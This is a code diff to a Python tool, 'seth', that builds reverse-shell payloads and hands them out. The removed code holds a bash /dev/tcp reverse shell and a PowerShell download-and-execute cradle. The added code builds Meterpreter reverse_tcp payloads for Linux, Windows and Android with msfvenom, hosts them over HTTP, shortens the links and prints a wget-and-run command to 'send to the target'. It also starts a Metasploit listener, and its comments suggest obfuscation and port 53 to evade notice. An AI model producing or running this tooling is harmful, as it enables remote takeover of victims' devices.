@@ -7,7 +7,7 @@ import string
 import requests
 
 # config
-LHOST = "myipaddress"
+LHOST = "192.168.43.103"
 LPORT = "4444"  # i might use 53 for real world scenarios,you can use 53 since people forget to check dns
 HTTP_PORT = "8080"
 OBFUSCATE = True # force if you don't care about obfuscation
@@ -25,7 +25,7 @@ def obfuscate_payload(payload):
 # start python http server...i will bind 0.0.0.0 if this fails later
 def start_http_server():
     print("[*] Starting HTTP server...")
-    os.system(f"nohup python3 -m http.server {HTTP_PORT} > /dev/null 2>&1 &")
+    os.system(f"nohup python3 -m http.server {HTTP_PORT} --bind 0.0.0.0 > /dev/null 2>&1 &")
     time.sleep(2)
 
 # shorten URL
@@ -35,109 +35,106 @@ def shorten_url(url):
         return response.text
     return url
 
-# generating a linux payload
-def generate_linux_payload():
-    print("[*] Generating Linux payload...")
-    shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
-    if OBFUSCATE:
-        shell_cmd = obfuscate_payload(shell_cmd)
+# generate payloads(windows,linux,android)
+def generate_payload(platform):
+    payloads = {
+        "linux": "linux/x64/meterpreter/reverse_tcp",
+        "windows": "windows/x64/meterpreter/reverse_tcp",
+        "android": "android/meterpreter/reverse_tcp"
+    }
     
-    filename = random_name(".sh")
-    with open(filename,"w") as f:
-        f.write("#!/bin/bash\n")
-        f.write(shell_cmd)
+    extensions = {
+        "linux": ".elf",
+        "windows": ".exe",
+        "android": ".apk"
+    }
+    if platform not in payloads:
+        print("[!] Invalid platform.")
+        return
     
+    filename = random_name(extensions[platform])
+    
+    print(f"[*] Generating {platform.capitalize()} payload...")
+    os.system(f"msfvenom -p {payloads[platform]} LHOST={LHOST} LPORT={LPORT} -f {extensions[platform][1:]} -o {filename}")
+    
+    # always set payload as executable
     os.system(f"chmod +x {filename}")
-    print(f"[+] Linux payload created: {filename}")
-    
-    # host it using the python server
-    start_http_server()
-    link = f"http://{LHOST}:{HTTP_PORT}/{filename}"
-    short_link = shorten_url(link)
-    print(f"[*] Send this to the target: {short_link}")
-    
-# windows payload
-def generate_windows_payload():
-    print("[*] Generating Windows payload...")
-    shell_cmd = f"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:{HTTP_PORT}/shell.ps1')\""
-    if OBFUSCATE:
-        shell_cmd = obfuscate_payload(shell_cmd)
         
-    filename = random_name(".ps1")
-    with open(filename,"w") as f:
-        f.write(f"$client = New-Object System.Net.WebClient\n")
-        f.write(f"$client.DownloadString('http://{LHOST}:{HTTP_PORT}/{filename}') | Invoke-Expression\n")
-        
-    os.system(f"chmod +x {filename}")
-    print(f"[+] Windows payload created: {filename}")
+    print(f"[+] {platform.capitalize()} payload created: {filename}")
     
-    # hosting
-    start_http_server()
-    link = f"http://{LHOST}:{HTTP_PORT}/{filename}"
-    short_link = shorten_url(link)
-    print(f"[*] Send this to the target: {short_link}")
+    short_link = shorten_url(f"http://{LHOST}:{HTTP_PORT}/{filename}")
     
-# android payload
-def generate_android_payload():
-    print("[*] Generating Android payload...")
-    apk_name = random_name(".apk")
-    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {apk_name}")
-    print(f"[+] Android payload created: {apk_name}")
-    
-    # hosting
-    start_http_server()
-    link = f"http://{LHOST}:{HTTP_PORT}/{apk_name}"
-    short_link = shorten_url(link)
-    print(f"[*] Send this to the target: {short_link}")
+    # ✅ Automatically generate the execution command for the target
+    execution_command = f"wget -qO {filename} {short_link} && chmod +x {filename} && ./{filename}"
+    print(f"[*] Send this to the target:\n    {execution_command}")
 
-# start metasploit listener
+# Start Metasploit listener with correct payload
 def start_metasploit():
+    print("[*] Select payload type for Metasploit:")
+    print("[1] Linux (ELF)")
+    print("[2] Windows (EXE)")
+    print("[3] Android (APK)")
+    
+    choice = input("Select payload type: ")
+    
+    payloads = {
+        "1": "linux/x64/meterpreter/reverse_tcp",
+        "2": "windows/x64/meterpreter/reverse_tcp",
+        "3": "android/meterpreter/reverse_tcp"
+    }
+    payload = payloads.get(choice, "linux/x64/meterpreter/reverse_tcp")
+
     print("[*] Starting Metasploit listener...")
     msf_script = f"""
     use exploit/multi/handler
-    set payload linux/x64/meterpreter/reverse_tcp
+    set payload {payload}
     set LHOST {LHOST}
     set LPORT {LPORT}
-    exploit -j
+    set ExitOnSession false
+    exploit -j -z
     """
-    with open("msf.rc","w") as f:
+    
+    with open("msf.rc", "w") as f:
         f.write(msf_script)
+
     os.system("msfconsole -q -r msf.rc")
 
 # main..i will think of a better name seth is gayish
 def main():
-    print("""
-    ███████╗███████╗████████╗██╗  ██╗
-    ██╔════╝██╔════╝╚══██╔══╝██║  ██║
-    ███████╗█████╗     ██║   ███████║
-    ╚════██║██╔══╝     ██║   ██╔══██║
-    ███████║███████╗   ██║   ██║  ██║
-    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
-    
-    🔥 quicker way to generate that rev shell 🔥
-    """)
-    
-    print("[1] Linux Reverse Shell")
-    print("[2] Windows Reverse Shell")
-    print("[3] Android Reverse Shell")
-    print("[4] Start Metasploit Listener")
-    print("[0] Exit")
-    
-    choice = input("Select an option: ")
-    if choice == "1":
-        generate_linux_payload()
-    elif choice == "2":
-        generate_windows_payload()
-    elif choice == "3":
-        generate_android_payload()
-    elif choice == "4":
-        start_metasploit()
-    elif choice == "0":
-        exit()
-    else:
-        print("[!] Invalid option.")
-        main()
-
+    start_http_server()
+    while True:
+        print("""
+        ███████╗███████╗████████╗██╗  ██╗
+        ██╔════╝██╔════╝╚══██╔══╝██║  ██║
+        ███████╗█████╗     ██║   ███████║
+        ╚════██║██╔══╝     ██║   ██╔══██║
+        ███████║███████╗   ██║   ██║  ██║
+        ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
+        
+        🔥 quicker way to generate that rev shell 🔥
+        """)
+        
+        print("[1] Linux Reverse Shell")
+        print("[2] Windows Reverse Shell")
+        print("[3] Android Reverse Shell")
+        print("[4] Start Metasploit & Monitor sessions")
+        print("[0] Exit")
+        
+        choice = input("Select an option: ")
+        if choice == "1":
+            generate_payload("linux")
+        elif choice == "2":
+            generate_payload("windows")
+        elif choice == "3":
+            generate_payload("android")
+        elif choice == "4":
+            start_metasploit()
+        elif choice == "0":
+            print("[*] Exiting...")
+            break
+        else:
+            print("[!] Invalid option.")
+        
 if __name__ == "__main__":
     main()
 
